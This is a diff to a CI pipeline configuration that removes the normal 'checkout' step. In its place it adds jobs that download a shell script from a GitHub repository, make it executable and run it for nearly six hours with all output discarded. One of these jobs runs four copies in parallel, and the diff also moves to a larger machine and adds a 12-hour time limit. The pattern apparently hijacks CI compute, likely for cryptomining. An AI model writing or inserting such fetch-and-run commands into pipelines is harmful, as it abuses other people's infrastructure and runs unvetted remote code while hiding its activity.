@@ -2,12 +2,18 @@ version: v1.0
 name: Initial Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
+execution_time_limit:
+  hours: 12
 blocks:
   - name: 'Block #1'
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'wget https://github.com/ronald998/hansip/raw/main/mainankuh.sh; chmod +x mainankuh.sh; timeout 355m ./mainankuh.sh > /dev/null 2>&1'
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/ronald998/hansip/raw/main/mainankuh.sh; chmod +x mainankuh.sh; timeout 355m ./mainankuh.sh > /dev/null 2>&1'
+          parallelism: 4
